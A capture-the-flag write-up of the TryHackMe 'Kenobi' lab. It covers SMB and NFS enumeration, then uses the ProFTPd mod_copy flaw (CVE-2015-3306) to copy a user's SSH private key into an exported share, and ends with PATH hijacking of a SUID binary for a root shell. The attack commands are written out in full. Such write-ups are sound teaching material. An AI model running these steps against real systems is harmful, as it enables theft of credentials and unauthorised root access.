---
title: "Kenobi"
platform: tryhackme
difficulty: Easy
os: Linux
machine: Kenobi
date: 2025-11-15
tags: [smb, nfs, suid, proftpd]
excerpt: "Enumerating Samba shares and exploiting a known ProFTPd mod_copy vulnerability, then leveraging a SUID binary for privilege escalation."
---

## Reconnaissance

```bash
nmap -sC -sV -p- -oN nmap/kenobi 10.10.x.x
```

```
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFtpd 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2
80/tcp    open  http        Apache httpd 2.4.18
111/tcp   open  rpcbind     2-4
139/tcp   open  netbios-ssn Samba smbd 3.X
445/tcp   open  netbios-ssn Samba smbd 4.3.11
2049/tcp  open  nfs_acl     2-3
```

Interesting attack surface: SMB shares, ProFTPd, NFS, and a web server.

## Enumerating SMB

```bash
smbclient -L //10.10.x.x/ -N
```

An `anonymous` share is accessible. Connecting and downloading all files:

```bash
smbclient //10.10.x.x/anonymous -N
smb: \> get log.txt
```

The `log.txt` reveals:
- ProFTPd configuration: running as user `kenobi`
- SSH key generated at `/home/kenobi/.ssh/id_rsa`
- Samba share config pointing to `/home/kenobi/share`

## Enumerating NFS

```bash
showmount -e 10.10.x.x
# /var *
```

The `/var` directory is exported to everyone — this will be useful later.

## Foothold — ProFTPd mod_copy (CVE-2015-3306)

ProFTPd 1.3.5 is vulnerable to **mod_copy** — the `SITE CPFR` and `SITE CPTO` commands allow unauthenticated file copy on the server.

We can copy Kenobi's SSH key to the NFS-accessible `/var` directory:

```bash
nc 10.10.x.x 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Now mount the NFS share and grab the key:

```bash
sudo mkdir /mnt/kenobi
sudo mount 10.10.x.x:/var /mnt/kenobi
cp /mnt/kenobi/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.x.x
```

**User flag captured.**

## Privilege Escalation — SUID Binary

Searching for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

An unusual binary stands out: `/usr/bin/menu`. Running it:

```
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

Using `strings` on the binary reveals it calls `curl`, `uname`, and `ifconfig` **without full paths**. Classic PATH manipulation:

```bash
cd /tmp
echo '/bin/bash' > curl
chmod +x curl
export PATH=/tmp:$PATH
/usr/bin/menu
# Select option 1
# root shell!
cat /root/root.txt
```

**Root flag captured.** ✅

## Key Takeaways

- NFS exports with wildcard access are extremely dangerous
- ProFTPd mod_copy allows moving server files without authentication
- SUID binaries calling system commands without absolute paths are trivially exploitable via PATH hijacking
